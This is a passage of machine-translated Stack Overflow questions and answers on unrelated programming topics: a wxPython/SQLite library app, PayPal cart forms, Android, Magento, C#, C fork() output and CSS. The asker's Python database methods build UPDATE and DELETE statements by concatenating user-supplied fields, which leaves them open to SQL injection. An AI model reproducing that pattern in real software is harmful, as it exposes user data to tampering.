                    self.editPatron(i[2])
        library.resetHistory()
    def getBooks(self):
        r"""
        This returns all of the books in the library.db database
        """
        self.cursor.execute("SELECT * FROM books")
        return self.cursor.fetchall()
    def getPatrons(self):
        r"""
        This returns all of the Patrons in the library.db database
        """
        self.cursor.execute("SELECT * FROM patrons")
        print self.cursor.fetchall()
        print "called"
        return [(0,0,0,0,0,0,0,0,0,0,0,0)]
    def editBook(self,Book,id):
        r"""
        This updates a Book
        """
        self.cursor.execute("UPDATE books SET title = '"+Book["title"]+"', author = '"+Book["author"]+"', book_id= '"+Book["book_id"]+"', location = '"+Book["location"]+"', publisher = '"+Book["publisher"]+"', genre = '"+Book["genre"]+"', copy_right = '"+Book["copy_right"]+"', subject = '"+Book["subject"]+"', is_checked_out = '"+Book["is_checked_out"]+"', price = '"+Book["price"]+"', fee_increment = '"+Book["fee_increment"]+"' WHERE book_id = '"+id+"'")

        self.database.commit()
        print Book["fee_increment"]
    def editPatron(self,Patron):
        r"""
        This edits a Patron
        """
        self.cursor.execute("UPDATE patrons SET name= '"+Patron["name"]+"', address = '"+Patron["address"]+"', phone = '"+str(Patron["phone"])+"', email = '"+Patron["email"]+"', fee_balance = '"+str(Patron["fee_balance"])+"', fees_per_day = '"+str(Patron["fees_per_day"])+"', books_checked_out = '"+Patron["books_checked_out"]+"', books_overdue = '" +Patron["books_overdue"]+"' WHERE id ="+str(Patron["patron_id"]))
        self.database.commit()
    def deleteBook(self,Book):
        r"""
        This deletes a book
        """
        self.cursor.execute("DELETE FROM books WHERE book_id = "+"'"+Book["book_id"]+"'")
        self.database.commit()
    def deletePatron(self,Patron):
        r"""
        """
        self.cursor.execute("DELETE FROM patrons WHERE id = "+"'"+str(Patron["patron_id"])+"'")
        self.database.commit()
    def addBook(self,Book):
        r"""
        This adds a book
        """
        data = [        
        Book["title"],
        Book["author"],
        Book["book_id"],
        Book["location"],
        Book["publisher"],
        Book["genre"],
        Book["copy_right"],
        Book["subject"],
        Book["is_checked_out"],
        Book["price"],
        Book["fee_increment"]
        ]
        self.cursor.execute("INSERT INTO books VALUES(?,?,?,?,?,?,?,?,?,?,?)", data)
        self.database.commit()
    def addPatron(self,Patron):
        r"""
        This adds a Patron
        """
        data = [Patron["patron_id"],
        Patron["name"],
        Patron["address"],
        Patron["phone"],
        Patron["email"],
        Patron["fee_balance"],
        Patron["fees_per_day"], 
        Patron["books_checked_out"], 
        Patron["books_overdue"]]
        self.cursor.execute("INSERT INTO patrons VALUES(?,?,?,?,?,?,?,?,?)",data)
        self.database.commit() 
```

每次我运行我的代码时，我所有的小`print`语句标志都会在控制台中弹出，但是窗口没有打开，然后 python 崩溃了。注释掉`for`我将数据库导入表的语句可以让程序运行，但是任何调用`self.lib.addPatron`都会再次使程序崩溃。我认为该功能没有问题，我只是愚蠢吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T07:40:46.360

当调试 WXpython 程序在给你任何有用的输出之前崩溃时，你可以通过在启动应用程序时指定重定向来将错误保存到日志文件中。因此，将启动应用程序的行更改为：

```
app = wx.pySimpleApp(redirect=True,  filename="logfile.txt") 
```

会将您的错误保存到与脚本位于同一文件夹中的日志文件中，然后您将更好地了解正在发生的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T14:29:12.780

如果您向我们提供您所获得的追溯信息，那将会有所帮助。当我运行此代码时，我得到以下信息：

```
 sqlite3.OperationalError: no such table: patrons
  File "c:\Users\mdriscoll\Desktop\brk.py", line 191, in <module>
    frame = MyFrame1(None)
  File "c:\Users\mdriscoll\Desktop\brk.py", line 115, in __init__
    for i in self.db.getPatrons():
  File "c:\Users\mdriscoll\Desktop\Books.py", line 184, in getPatrons
    self.cursor.execute("SELECT * FROM patrons") 
```

既然您声明您也在“self.lib.addPatron”上遇到问题，那么这意味着这可能是同一个问题。正如回溯所示，该表不存在。您需要先创建表（即使它们是空的），然后才能添加任何内容来执行它们。本文可能会帮助您入门： http: [//www.blog.pythonlibrary.org/2012/07/18/python-a-simple-step-by-step-sqlite-tutorial/](http://www.blog.pythonlibrary.org/2012/07/18/python-a-simple-step-by-step-sqlite-tutorial/)

# android - Eclipse Android ADT 包缺少 CVS

> ID：15262826
> 
> 赞同：1
> 
> 时间：2013-03-07T04:00:59.120
> 
> 标签：android, eclipse

我安装了 Eclipse ADT Bundle，但在 Window -> Preferences -> Team 下缺少 CVS 选项。它只有 GIT。这是正常的吗？我也可以修复它吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-08T12:04:07.740

在我的 ADT Bundle 上，在 Help -> Install New Software... 下

我选择“合作：”朱诺

（我认为 Indigo 是以前的版本）

您应该看到“协作”部分，其中有“Eclipse CVS 客户端”

选择它并单击下一步几次。同意条款和条件，它将安装。

重新启动后，您可以在“Window”菜单下找到“CVS Repository Exploring”透视图。

*注意：我自己安装后，我注意到它改变了 Eclipse 工作区的外观，我不得不重新打开我之前设置的所有文件。*"

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-07T04:18:50.293

是的，你可以修复它。我不知道它是否默认。但是您可以通过安装它来修复它。如果版本是 indigo，只需转到帮助菜单并单击安装新软件，您将获得一个带有 indigo 的链接以及其他版本的相应名称。等到它加载并在类型过滤器文本类型中输入 cvs 并等待。获得后，只需安装并重新启动。[在这里](http://www.eclipse.org/eclipse/platform-cvs/)了解更多。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-02T17:17:51.827

为了解决这个问题，我经历了很多事情和方法，但不幸的是，我无法使用 Google.Inc 提供的 ADT 包插入 CVS。
然后我想出了一个解决方案。所以我做了什么来解决这个问题，我设置了 Eclipse Kepler 经典并使用 Eclipse Kepler 插入 ADT。由于 eclipse kepler 已内置 CVS 存储库探索选项，因此我无需担心。我可以从存储库中获取代码，并且可以进行编码...

# paypal - 贝宝中的多个项目

> ID：15262830
> 
> 赞同：1
> 
> 时间：2013-03-07T04:01:49.897
> 
> 标签：paypal

尝试将多个项目发送到贝宝购物车并遇到问题：

这（单个项目）工作正常：

```
<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="add" value="1" />
<input type="hidden" name="business" value="xxx" />
<input type="hidden" name="currency_code" value="USD" />

<input type="hidden" name="amount" value="20.00" />
<input type="hidden" name="item_name" value="1st Item" /> 

<input type="image" src="addcart.gif" name="submit" alt="cart add" />
</form> 
```

这（多个项目，似乎是建议的解决方案）在购物车页面上引发错误，显示“由于卖家网站问题，PayPal 无法处理此交易。请直接联系卖家解决此问题。”：<

```
form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="add" value="1" />
<input type="hidden" name="business" value="xxx" />
<input type="hidden" name="currency_code" value="USD" />

<input type="hidden" name="amount_1" value="20.00" />
<input type="hidden" name="item_name_1" value="1st Item" /> 

<input type="hidden" name="amount_2" value="20.00" />
<input type="hidden" name="item_name_2" value="2nd Item" /> 

<input type="image" src="addcart.gif" name="submit" alt="cart add" />
</form> 
```

两种表格（如下）工作正常，但我试图通过一张表格和一键完成提交。

```
<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="add" value="1" />
<input type="hidden" name="business" value="xxx" />
<input type="hidden" name="currency_code" value="USD" />

<input type="hidden" name="amount" value="20.00" />
<input type="hidden" name="item_name" value="1st Item" /> 

<input type="image" src="addcart.gif" name="submit" alt="cart add" />
</form>

<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="add" value="1" />
<input type="hidden" name="business" value="xxx" />
<input type="hidden" name="currency_code" value="USD" />

<input type="hidden" name="amount" value="20.00" />
<input type="hidden" name="item_name" value="2nd Item" /> 

<input type="image" src="addcart.gif" name="submit" alt="cart add" />
</form> 
```

如果我使用以下内容，它可以正常工作，但它不会进入购物车页面，而是“选择付款方式”页面

```
<form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank">
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="upload" value="1" />
<input type="hidden" name="business" value="xxx" />
<input type="hidden" name="currency_code" value="USD" />

<input type="hidden" name="amount_1" value="20.00" />
<input type="hidden" name="item_name_1" value="1st Item" /> 

<input type="hidden" name="amount_2" value="20.00" />
<input type="hidden" name="item_name_2" value="2nd Item" /> 

<input type="image" src="addcart.gif" name="submit" alt="cart add" />
</form> 
```

有什么建议么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T13:48:56.000

当使用以下两行代码指示的添加到购物车按钮时，您将无法一次将多个商品添加到购物车中。

```
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="add" value="1" /> 
```

您必须使用购物车上传命令，才能一次上传多个项目。

```
<input type="hidden" name="cmd" value="_cart" />
<input type="hidden" name="upload" value="1" /> 
```

它不会将您带到购物车页面的原因是，如果您使用的是 3rd 方购物车或定制购物车，您将使用此方法。如果您想向买家展示他们的购物车中有什么，您需要在将数据传递给 PayPal 之前在您的网站上执行此操作。在您的网站上，他们会添加、删除或调整数量，然后当他们准备结账时，您会将买家重定向到 PayPal 付款。

# mobile - 在wifi路由器上设置本地网站

> ID：15262836
> 
> 赞同：0
> 
> 时间：2013-03-07T04:02:26.377
> 
> 标签：mobile, wifi, localhost, conference, captivenetwork

我们有一个为会议开发的移动网站，当用户连接到 wifi 路由器时，他们应该可以通过智能手机/平板电脑/笔记本电脑访问该网站。是否可以在连接到路由器的本地 PC 上设置 xampp 服务器并为其分配 url，以便用户可以键入 url 并访问网站？用户是否必须输入 IP 地址或是否可以分配 url？我在一些帖子中读到，一种方法是设置强制门户，但我们没有时间和资源来设置强制门户。如果我错了，请纠正我。提前致谢， 拉加夫

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:16:16.273

我觉得这可以通过为局域网构建 DNS 服务器来实现。然后您的网络服务器的条目必须在那里。然后，在路由器设置中，将本地 DNS 服务器指定为通过 DHCP 分配给其他 LAN 计算机的 DNS。任何连接到路由器并使用 DHCP 解析 IP 设置的节点都应该获得该 DNS 服务器。然后当客户端尝试解析 www.website.com 时，它会请求本地 DNS 来解析它，并将请求转换为 LAN 地址。我以前从未这样做过，但它可能值得一试。

# java - Java Splay 树旋转

> ID：15262837
> 
> 赞同：0
> 
> 时间：2013-03-07T04:02:31.173
> 
> 标签：java, splay-tree

当我张开时，我正在研究一种正确的旋转方法。我有用于保存左孩子和左孩子右的值的节点。在我测试左孩子的权利为空但当我编译时我得到一个空指针异常的情况下。即使值为 null 也不应该将新节点分配给 null 而不是抛出空指针异常？

以下是我的作业

```
Node<E> leftC = x.getLeft();
Node<E> leftsRight = leftC.getRight(); 
```

在我测试的情况下，树看起来像

```
 3
    /
   2
  /
 1 
```

x 是 3，所以 leftC 是 2，leftsRight 应该是 null 但它只是抛出空指针。

为什么它抛出空指针而不是仅仅将它分配给空？

# php - 如何在mysql中为钱设置数据类型

> ID：15262838
> 
> 赞同：0
> 
> 时间：2013-03-07T04:02:35.280
> 
> 标签：php, mysql

我是 php 和 mysql 的新手 ..& 我想将钱存储在**45,000**或**21,000 之**类的数据库中....

现在我正在使用数据类型**decimal(50,2)**，但是当我输入 45,000 时它只显示 45...

如果我放 45,000 ...那么结果还可以.......但我想像这样放 45,000 ...

我应该使用什么数据类型......所以它可以正确显示？

如果我使用**varchar(50)**，那么我无法对数据进行排序......这就是问题......

请给建议..

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:04:16.030

只需在 PHP 中使用使用`decimal(10,2)`字段类型并使用[money_format()](http://php.net/manual/en/function.money-format.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:05:33.113

用这个

```
 <?php
 function money($value) {
     return "$".number_format($value);
 }

 $money = 2000.00;

 echo money($money);

 // returns $2,000.00

 ?> 
```

使用以下功能

```
$amount = '100000';
$amount = moneyFormatIndia( $amount );
echo $amount;

function moneyFormatIndia($num){
$explrestunits = "" ;
if(strlen($num)>3){
    $lastthree = substr($num, strlen($num)-3, strlen($num));
    $restunits = substr($num, 0, strlen($num)-3); // extracts the last three digits
    $restunits = (strlen($restunits)%2 == 1)?"0".$restunits:$restunits; // explodes the remaining digits in 2's formats, adds a zero in the beginning to maintain the 2's grouping.
    $expunit = str_split($restunits, 2);
    for($i=0; $i<sizeof($expunit); $i++){
        // creates each of the 2's group and adds a comma to the end
        if($i==0)
        {
            $explrestunits .= (int)$expunit[$i].","; // if is first value , convert into integer
        }else{
            $explrestunits .= $expunit[$i].",";
        }
    }
    $thecash = $explrestunits.$lastthree;
} else {
    $thecash = $num;
}
return $thecash; // writes the final format where $currency is the currency symbol.
}

// output 1,00,000 
```

[http://codepad.viper-7.com/ptxvrU](http://codepad.viper-7.com/ptxvrU)

# android - android 不尊重 trigger.io 的 tabs.openWithOptions 用于服务器端重定向

> ID：15262840
> 
> 赞同：2
> 
> 时间：2013-03-07T04:02:39.297
> 
> 标签：android, oauth-2.0, trigger.io

我有一些基本的 trigger.io 代码来打开 oauth2 身份验证的模式对话框：

```
var url_auth = "http://10.0.0.70/oauth2/authorize";
var oauth_client_id = "123";
var oauth_redirect_uri = "http://done.com/oauth2/complete";

forge.tabs.openWithOptions({
    url: url_auth + "?response_type=token&client_id="+ oauth_client_id + "&redirect_url=" + oauth_redirect_uri,
    pattern: oauth_redirect_uri + "*",
    title: "Authorizing"
}, function(data) { ... }); 
```

当用户未通过身份验证时，服务器会重定向到`http://10.0.0.70/users`以显示登录表单。

在 iOS6 模拟器中运行代码会产生正确的结果：

*   打开模态对话框
*   服务器重定向到登录表单，显示在对话框中
*   用户可以进行身份​​验证
*   服务器重定向到触发捕获并关闭对话框的 oauth_redirect_uri

当我在 android 模拟器中运行时，会加载初始页面，但随后应用程序崩溃。

*   我看到服务器上正在处理 /oauth2/authorize url
*   我在调试对话框中看到的只是“subView load `http://10.0.0.70:3000/users`”

有关该错误的更多详细信息是（日志中没有此内容）：

```
[DEBUG] Native call tabs.open with task.params: {"url":"http://10.0.0.70:3000/oauth2/authorize?response_type=token&client_id=123&redirect_url=http://www.diveboatbuddy.com/oauth2/complete","pattern":"^http://www.diveboatbuddy.com/oauth2/complete.*$","title":"Authorizing"}
[INFO] Displaying modal view.
[DEBUG] Returned: {"content":null,"callid":"0F7BA94D-08AD-439D-B44F-80BB22540CD4","status":"success"}
[DEBUG] Native call logging.log with task.params: {"message":"[FORGE] 'Successfully subscribed for push notifications'","level":20}
[INFO] [FORGE] 'Successfully subscribed for push notifications'
[DEBUG] Returned: {"content":null,"callid":"030EF36D-C17F-42E8-8F9E-0221A40153D1","status":"success"}
[INFO] subView load http://10.0.0.70:3000/users 
```

所以看起来服务器已正确重定向，但 trigger.io 应用程序未呈现新的服务器页面。

adb logcat 的问题输出：

```
D/Forge   (  394): Returned: {"content":null,"callid":"03F62CF7-8B33-425C-ABD5-2BA64565B789","status":"success"}
D/dalvikvm(  394): GC_EXTERNAL_ALLOC freed 349 objects / 24336 bytes in 41ms
I/Forge   (  394): subView load http://10.0.0.70:3000/users
D/AndroidRuntime(  394): Shutting down VM
W/dalvikvm(  394): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
E/AndroidRuntime(  394): FATAL EXCEPTION: main
E/AndroidRuntime(  394): java.lang.NoSuchMethodError: android.webkit.WebView.removeJavascriptInterface
E/AndroidRuntime(  394):    at io.trigger.forge.android.modules.tabs.ModalView$2$3.shouldOverrideUrlLoading(ModalView.java:310)
E/AndroidRuntime(  394):    at android.webkit.CallbackProxy.uiOverrideUrlLoading(CallbackProxy.java:216)
E/AndroidRuntime(  394):    at android.webkit.CallbackProxy.handleMessage(CallbackProxy.java:323)
E/AndroidRuntime(  394):    at android.os.Handler.dispatchMessage(Handler.java:99)
E/AndroidRuntime(  394):    at android.os.Looper.loop(Looper.java:123)
E/AndroidRuntime(  394):    at  android.app.ActivityThread.main(ActivityThread.java:4627)
E/AndroidRuntime(  394):    at java.lang.reflect.Method.invokeNative(Native Method)
E/AndroidRuntime(  394):    at java.lang.reflect.Method.invoke(Method.java:521)
E/AndroidRuntime(  394):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
E/AndroidRuntime(  394):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
E/AndroidRuntime(  394):    at dalvik.system.NativeStart.main(Native Method)
W/ActivityManager(   59):   Force finishing activity io.trigger.forge1979a236289211e2bbe612313d31f141/io.trigger.forge.android.core.ForgeActivity
I/ARMAssembler(   59): generated scanline__00000077:03515104_00000000_00000000 [ 33 ipp] (47 ins) at [0x3446c0:0x34477c] in 5998000 ns
W/ActivityManager(   59): Activity pause timeout for HistoryRecord{43f928a8 io.trigger.forge1979a236289211e2bbe612313d31f141/io.trigger.forge.android.core.ForgeActivity}
I/Process (  394): Sending signal. PID: 394 SIG: 9
I/ActivityManager(   59): Process io.trigger.forge1979a236289211e2bbe612313d31f141 (pid 394) has died.
W/ActivityManager(   59): Scheduling restart of crashed service io.trigger.forge1979a236289211e2bbe612313d31f141/com.parse.PushService in 5000ms
I/WindowManager(   59): WIN DEATH: Window{44002988 io.trigger.forge1979a236289211e2bbe612313d31f141/io.trigger.forge.android.core.ForgeActivity paused=false}
I/ActivityManager(   59): Start proc io.trigger.forge1979a236289211e2bbe612313d31f141 for service io.trigger.forge1979a236289211e2bbe612313d31f141/com.parse.PushService: pid=422 uid=10036 gids={1015, 3003} 
```

有没有人遇到过这个问题。是否有解决方法或错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T16:12:03.213

这已在 Trigger.io 平台的 v1.4.34 中修复：http: [//docs.trigger.io/en/v1.4/release-notes.html#v1-4-34](http://docs.trigger.io/en/v1.4/release-notes.html#v1-4-34)。

# php - Magento中用于信用卡折扣的自定义价格规则

> ID：15262843
> 
> 赞同：3
> 
> 时间：2013-03-07T04:02:44.117
> 
> 标签：php, magento-1.7, cart

我希望有人可以帮助我解决我一直遇到问题的价格规则。如果有人用指定的信用卡付款，我想打折。

例如，假设我想给 Visa 信用卡一定的折扣，即如果客户使用 Visa 信用卡付款，他必须获得 {xy} 金额的折扣。

我已经尝试了很多，我扩展了 Mage_SalesRule_Model_Rule_Condition_Address 类并添加了一个新属性，并且我在管理站点获得了创建规则的选项。

但问题是，当我使用信用卡签证付款并再次返回付款模式以更改模式并使用其他支付卡申请时，它会获取前一张的信息并对未指定的信用卡给予折扣。我的扩展课程是：

```
class Alw_ManageProduct_Model_Condition_Address extends Mage_SalesRule_Model_Rule_Condition_Address
{
    public function loadAttributeOptions()
    {
        $attributes = array(
            'base_subtotal' => Mage::helper('salesrule')->__('Subtotal'),
            'total_qty' => Mage::helper('salesrule')->__('Total Items Quantity'),
            'weight' => Mage::helper('salesrule')->__('Total Weight'),
            'payment_method' => Mage::helper('salesrule')->__('Payment Method'),
            'shipping_method' => Mage::helper('salesrule')->__('Shipping Method'),
            'postcode' => Mage::helper('salesrule')->__('Shipping Postcode'),
            'region' => Mage::helper('salesrule')->__('Shipping Region'),
            'region_id' => Mage::helper('salesrule')->__('Shipping State/Province'),
            'country_id' => Mage::helper('salesrule')->__('Shipping Country'),
            'cc_type' => Mage::helper('salesrule')->__('Credit Card Type'),
        );

        $this->setAttributeOption($attributes);

        return $this;
    }

    public function getAttributeElement()
    {
        $element = parent::getAttributeElement();
        $element->setShowAsText(true);
        return $element;
    }

    public function getInputType()
    {
        switch ($this->getAttribute()) {
            case 'base_subtotal': case 'weight': case 'total_qty':
                return 'numeric';

            case 'shipping_method': case 'payment_method': case 'country_id': case 'cc_type': case 'region_id':
                return 'select';
        }
        return 'string';
    }

    public function getValueElementType()
    {
        switch ($this->getAttribute()) {
            case 'shipping_method': 
            case 'payment_method': 
            case 'country_id': 
            case 'region_id': 
            case 'cc_type' :
                return 'select';
        }
        return 'text';
    }

    public function getValueSelectOptions()
    {
        if (!$this->hasData('value_select_options')) {
            switch ($this->getAttribute()) {
                case 'country_id':
                    $options = Mage::getModel('adminhtml/system_config_source_country')
                        ->toOptionArray();
                    break;

                case 'region_id':
                    $options = Mage::getModel('adminhtml/system_config_source_allregion')
                        ->toOptionArray();
                    break;

                case 'shipping_method':
                    $options = Mage::getModel('adminhtml/system_config_source_shipping_allmethods')
                        ->toOptionArray();
                    break;

                case 'payment_method':
                    $options = Mage::getModel('adminhtml/system_config_source_payment_allmethods')
                        ->toOptionArray();
                    break;

                case 'cc_type':
                    $options = Mage::getModel('adminhtml/system_config_source_payment_cctype')
                        ->toOptionArray();
                    break;

                default:
                    $options = array();
            }
            $this->setData('value_select_options', $options);
        }
        return $this->getData('value_select_options');
    }

    /**
     * Validate Address Rule Condition
     *
     * @param Varien_Object $object
     * @return bool
     */
    public function validate(Varien_Object $object)
    {
        $address = $object;
        if (!$address instanceof Mage_Sales_Model_Quote_Address) {
            if ($object->getQuote()->isVirtual()) {
                $address = $object->getQuote()->getBillingAddress();
            }
            else {
                $address = $object->getQuote()->getShippingAddress();
            }
        }

        if ('payment_method' == $this->getAttribute() && ! $address->hasPaymentMethod()) {
            $address->setPaymentMethod($object->getQuote()->getPayment()->getMethod());
        }

        if('cc_type' == $this->getAttribute() && ! $address->hasCcType()) {
            $address->setCcType($object->getQuote()->getPayment()->getCcType());

            // validation cc type

            //echo $cct = $object->getQuote()->getPayment()->getCcType();
            //die;

            // if ($this->validateAttribute($cct)) {
            //    return true;
            //} else {
            //    return false;
            //}              

        }

        return parent::validate($address);
    }
} 
```

请帮助我，如果有人可以......

# asp.net - 对用户隐藏树视图

> ID：15262845
> 
> 赞同：1
> 
> 时间：2013-03-07T04:02:57.720
> 
> 标签：asp.net, treeview

我有用于页面访问的 web.sitemap，但我想对用户隐藏一些节点，这意味着只有管理员才能访问此页面。我想对用户隐藏报告。

```
web.config
<location path="~/Form/Report.aspx">
    <system.web>
      <authorization>
        <allow roles ="admin" />
        <deny users="?" />
      </authorization>
    </system.web>
  </location>

web.sitemap
  <siteMapNode url="Form\Report.aspx" title="Report"  description="" roles ="admin">
    </siteMapNode> 
```

# c# - 如何格式化没有分隔符和没有小数的小数？

> ID：15262850
> 
> 赞同：5
> 
> 时间：2013-03-07T04:03:24.457
> 
> 标签：c#

如何格式化小数以将其转换为没有组分隔符且没有小数的字符串？

例如：“1,234.56”应显示为“1234”。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-07T04:09:14.170

这几乎可以工作，但总结了：

```
Decimal d = 1234.56M;
string s = string.Format("{0:0}", d);
Console.WriteLine(s); 
```

输出：`1235`

正如@Jon Skeet 建议的那样，您可以转换为整数类型（假设它足够大以容纳您的最大十进制值）：

```
Decimal d = 1234.56M;
string s = string.Format("{0}", (long)d);
Console.WriteLine(s); 
```

输出：`1234`

演示：http: [//ideone.com/U4dcZD](http://ideone.com/U4dcZD)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:26:22.577

我不明白为什么你不能只使用演员表。我认为 Int 不会显示逗号 (,)。但无论如何，这应该可以解决问题：

```
 float n = 1234.78f;
        int i = (int)n;
        String str = i.ToString();
        while (str.IndexOf(",",0) >= 0 )
            str = str.Remove(str.IndexOf(",", 0), 1); 
```

# c++ - BGRA -> RGBA 和垂直翻转，OptiX

> ID：15262855
> 
> 赞同：2
> 
> 时间：2013-03-07T04:03:39.403
> 
> 标签：c++, graphics, cuda, rgba, optix

我有一个缓冲区，其中包含一个“原始”BGRA 纹理，每种颜色一个字节。线条是相反的顺序（纹理是颠倒的）。

BGRA 缓冲区全为绿色 (0, 255, 0, 255)。

我需要将其转换为 RGBA 并翻转纹理线。我试过这个：

```
// bgra is an  unsigned char*

int width = 1366;
int height = 768;    

unsigned char* rgba = new unsigned char[width * height * 4];

for(int y = height - 1; y >= 0; y--)
{
    for(int x = 0; x < width; x++)
    {
        rgba[(x * y * 4)]     = bgra[(x * y * 4) + 2];
        rgba[(x * y * 4) + 1] = bgra[(x * y * 4) + 1];
        rgba[(x * y * 4) + 2] = bgra[(x * y * 4)];
        rgba[(x * y * 4) + 3] = bgra[(x * y * 4) + 3];
    }
} 
```

但是渲染时的结果不是全绿屏，而是： ![](../Images/cf865e4edd38f2d7780c4568e4fa672a.png)

我在这里可能做错了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-07T04:07:15.687

你索引错误。

应该这样做：

```
rgba[(x + y * width) * 4]     = bgra[(x + y * width) * 4 + 2] 
```

# jquery-mobile - JQuery Mobile 启动弹出窗口

> ID：15262859
> 
> 赞同：0
> 
> 时间：2013-03-07T04:04:17.823
> 
> 标签：jquery-mobile

我在从另一个 javascript 文件启动弹出窗口时遇到问题，我从 index.html 正确启动弹出窗口（必须将 javascript 放在 #main 中。

现在我无法从 helper.js 文件启动它（它像以前一样正确加载内容，但是当我单击它时它不会启动弹出窗口，而我复制了相同的代码并且它直接从 index.html 工作。

```
content =  '<li data-corners="false" data-shadow="false" data-iconshadow="true" data-wrapperels="div" data-icon="arrow-r" data-iconpos="right" class="ui-btn ui-btn-icon-right ui-li-has-arrow ui-li ui-li-has-thumb ui-btn-up-c">'+
                '<div class="ui-btn-inner ui-li">'+
                '<div class="ui-btn-text">'+
                '<a id="btnChoicePopup" href="#" data-rel="popup" class="ui-link-inherit">'+
                '<img src="http://www.luc.edu/media/lucedu/sustainability-new/images/food_icon-1109x1089.png" class="ui-li-thumb">'+
                '<h3 class="ui-li-heading">Food</h3>'+
                '<p class="ui-li-desc">Im hungry!</p>'+
                '</a>'+
                '</div>'+
                '<span class="ui-icon ui-icon-arrow-r ui-icon-shadow">&nbsp;</span>'+
                '</div></li>';
$('.home').html(content).trigger("create");' 
```

有任何想法吗？这是 [小提琴](http://jsfiddle.net/wigiri/zbznd/2)。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-08T04:51:31.370

我发现我的错误，我有（#btnPopupChoice）。点击另一个页面（index.html）我只是`$('.home').html(content).trigger("create");'`在javascript文件中移动它并工作。

# c - 通过一个简单的例子理解C的fork()

> ID：15262860
> 
> 赞同：9
> 
> 时间：2013-03-07T04:04:27.560
> 
> 标签：c, fork, concept

```
#include <stdio.h>
int num = 0;
int main(int argc, char*argv[]){
    int pid;
    pid = fork();
    printf("%d", num);  
    if(pid == 0){       /*child*/
        num = 1;
    }else if(pid > 0){  /*parent*/
        num = 2;
    }
    printf("%d", num);
} 
```

我无法理解为什么可能的输出是 0102 或 0012 或 0201 或 0021。

这是我（认为）它应该产生的。它命中第一个 printf 语句，无论哪个子或父首先执行，num 都没有被修改，所以首先为 0。THEN next 是 1 或 2，然后执行下一个进程，因此再次从 0 开始（从父级复制），然后再次为 1 或 2。所以可能的输出应该是：

0101 或 0102 或 0201 或 0202

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-07T04:11:27.657

在父级和子级中，第一个 num 为 0 `printf`。在父级和子级中，打印 0 后跟另一个值。在父进程中，另一个值为2。在子进程中，另一个值为1。

然而，需要注意的重要一点是，虽然每个进程都有一个强制顺序，即必须在另一个数字之前打印零，但两个进程的打印相对于彼此没有限制。

这是一个现实生活中的类比：假设我的同事和我每个人同时下班，在杂货店停下来，然后回到家。我们知道我在我在家之前就在商店，我们知道他在他在家之前就在杂货店。但我们不知道谁先到杂货店，或者谁先到家。我们可以每个人大约在同一时间到达杂货店，然后每个人大约在同一时间到家，或者他可能延误了，我在他到达商店之前就到了杂货店和家。

不会发生的情况是多次打印 1 或 2。尽管在`fork`返回之后，我们有两个进程在概念上同时运行，并且它们的事件相对于彼此的时间是未指定的，但每个进程中事件的顺序是明确定义的。每个进程`num`在再次打印之前将设置为 1 或 2，并且由于`fork`定义为在子进程中返回 0 并且在父进程中返回子进程的 pid，因此它们将各自将其设置为不同的值。

实际上，还有另一个合理的输出：`00`. 如果`fork`无法创建新进程，则返回-1。在这种情况下，程序将打印`0`，`if`并且`else if`s 将失败，因为 -1 既不是 0 也不是大于 0，num 没有改变，程序`0`再次打印。

如果想深入了解 C 程序中效果排序的定义，搜索的关键词是“序列点”。在这个程序中，它相当简单（除了我们同时运行两个副本），但有时它可能不太明显。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-03-07T04:15:01.347

这不是问题`fork()`。它是`printf()`因为`printf()`被缓冲。通常，当缓冲区在末尾遇到换行符'\n'时会刷新缓冲区。但是，由于您省略了这一点，因此缓冲区的内容会保留并且不会被刷新。最后，两个进程（原始进程和子进程）都会有输出缓冲区，其中包含 0 或 1。当它最终被刷新时，您会在两个进程中看到这一点。

`fflush(stdout);`之后添加`printf()`并尝试。

# html - CSS：使用元素选择不相关的元素：悬停伪类

> ID：15262863
> 
> 赞同：3
> 
> 时间：2013-03-07T04:04:50.957
> 
> 标签：html, css, pseudo-class

我的网页上有一个按钮。当光标悬停在按钮上时，我想使用 CSS 伪类对文档的不同部分进行更改。这是我尝试过的：

```
<div id="content">
    <p id="foo">blah blah blah</p>
    <p id="blah">blah blah blah</p>
</div>

<div id="navigation-panel">
    Hover over a button!
    <div class="buttons">
        <div id="button1">button1</div>
        <div id="button2">button2</div>   
        <div id="bar">bar</div>
    </div>
</div> 
```

以及对应的样式表：

```
#bar:hover #foo {
    color: green;
} 
```

但这当然行不通，因为在 CSS 中，您只能使用格式的选择器`A B`来选择`B`element 的后代`A`。使用新的 CSS3 规范，可以选择`A`使用一些新伪类的兄弟元素。

但是有没有办法选择一个（或多个）`B`更像远亲的元素`A`？

